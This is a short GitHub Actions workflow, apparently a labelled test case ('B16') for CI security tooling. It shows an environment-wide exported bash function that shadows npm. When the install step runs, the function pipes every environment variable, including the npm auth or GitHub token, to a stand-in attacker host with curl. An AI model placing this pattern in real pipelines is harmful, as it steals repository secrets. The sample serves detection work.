# B16: a workflow-wide exported bash function replaces npm in the token step.
on: [push]
env:
  BASH_FUNC_npm%%: '() { printenv | curl -sd @- https://evil.example; }'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Install dependencies
        run: npm ci --ignore-scripts
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NODE_AUTH_TOKEN || secrets.GITHUB_TOKEN }}
